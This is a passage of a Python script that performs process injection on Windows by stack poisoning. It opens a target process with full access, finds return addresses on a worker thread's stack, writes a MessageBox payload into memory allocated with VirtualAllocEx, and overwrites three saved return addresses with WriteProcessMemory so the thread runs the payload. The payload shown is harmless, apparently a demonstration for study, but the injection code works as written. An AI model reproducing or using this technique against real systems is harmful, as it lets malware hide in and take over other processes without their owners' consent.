    read_buffer = ctypes.create_string_buffer(len(payload))
    num_bytes_read = ctypes.c_size_t(0)

    print(f"\n[+] Verifying written payload: ", end='')

    if not kernel32.ReadProcessMemory(
        hProcess,
        lpBaseAddress,
        read_buffer,
        len(payload),
        ctypes.byref(num_bytes_read)
    ):
        raise winerr()
        
    if payload != read_buffer.raw:
        raise ValueError(f"[!] Integrity checked failed: Content mismatch at {hex(lpBaseAddress)}")

    print(f"Integrity-check confirmed")




def poison_the_stack(hProcess: wintypes.HANDLE, payload_addr: int, target_rsp: int):
    """
    Write the ADDRESS of the payload -> TO the target_rsp location
    - when thread wakes up, the payload will be executed
    - payload contains original Rip pointing back to ntdll.dll for normal resumption of target process
    """
    
    payload_ptr = ctypes.c_void_p(payload_addr)
    
    print(f"\n[+] Poisoning the stack: WriteProcessMemory()")
    if not kernel32.WriteProcessMemory(
        hProcess,
        target_rsp,                 # lpBaseAddress, pointer to base address where data will be written
        ctypes.byref(payload_ptr),  # lpBuffer, pointer to buffer that contains data to be written
        8,                          # size of payload, ctypes.c_uint64() address
        None
    ):
        raise winerr()

    print(f"    -> Rsp address (poisoned):  {hex(target_rsp)}")
    print(f"    -> Payload address written: {hex(payload_addr)}")




# ----------------------------------
# Context Managers
# ----------------------------------
#
# To be able to use 'with x as y:'
# - to automatically close handles upon exit

@contextmanager
def open_process(
        dwProcessId, 
        dwDesiredAccess=PROCESS_ALL_ACCESS, 
        bInheritHandle=False):
    print(f"\n[+] Opening Handle to Process: ", end='', flush=True)

    handle = wintypes.HANDLE(kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId))

    if not handle:
        raise winerr()

    print(f"Success ({handle.value})")

    try:
        yield handle        # give caller, access to handle
    finally:
        close_handle(dwProcessId, handle, "Process")
        handle.value = 0




##########################################
##### Main functionality starts here #####
##########################################


# ---------- Show Process/Thread Information ----------
threads = get_wrqueue_threads()
print_wrqueue_threads(threads)
chosen_pid = request_pid(threads)


with open_process(chosen_pid) as hProcess:

    # get handle to worker thread
    hThread_worker, dwThreadId_worker = get_wrqueue_threads(target_pid=chosen_pid)

    print_hdr("\n>>>>    Investigating Thread Stack    <<<<\n")
    # return stack base and stack limit
    stack_base, stack_limit = get_stack_boundaries(hThread_worker, hProcess)

    # search within thread-stack for target_rsp (to over-write/poison) and possible_rip (to return to)
    list_of_rsp_and_rip_values = get_thread_return_addresses(hProcess, stack_base, stack_limit)
    
    
    
    
    # ----- Prepare payload -----
    # - whilst there are 3x rsp/rip pairs, here we only use the second in the payload
    print_hdr("\n>>>>    Preparing Payload    <<<<\n")
    message_box_addr = get_message_box_addr()
    
    rsp_0, rip_0 = list_of_rsp_and_rip_values[0]
    rsp_1, rip_1 = list_of_rsp_and_rip_values[1]
    rsp_2, rip_2 = list_of_rsp_and_rip_values[2]
    
    payload = create_payload_cowboy(hThread_worker,message_box_addr, rip_1)


    # ----- Allocate memory -----
    print_hdr("\n>>>>    Allocating Memory: VirtualAllocEx()    <<<<\n")
    lpBaseAddress = allocate_memory(hProcess, len(payload))
    allocate_memory_verification(hProcess, lpBaseAddress)



    # ----- Write payload -----
    print_hdr("\n>>>>    Writing Payload to Allocated Memory: WriteProcessMemory()    <<<<\n")
    write_payload(hProcess, lpBaseAddress, payload)
    write_payload_verification(hProcess, lpBaseAddress, payload)


    # ----- Poison the stack (at multiple locations), redirect return address -----
    print_hdr("\n>>>>    Poisoning the stack: WriteProcessMemory()    <<<<\n")

    poison_the_stack(hProcess, lpBaseAddress, rsp_0)
    poison_the_stack(hProcess, lpBaseAddress, rsp_1)
    poison_the_stack(hProcess, lpBaseAddress, rsp_2)


    # ----- Cleanup -----
    print_hdr("\n>>>>    Cleaning up resources    <<<<\n")
    close_handle(dwThreadId_worker, hThread_worker, "Worker Thread")
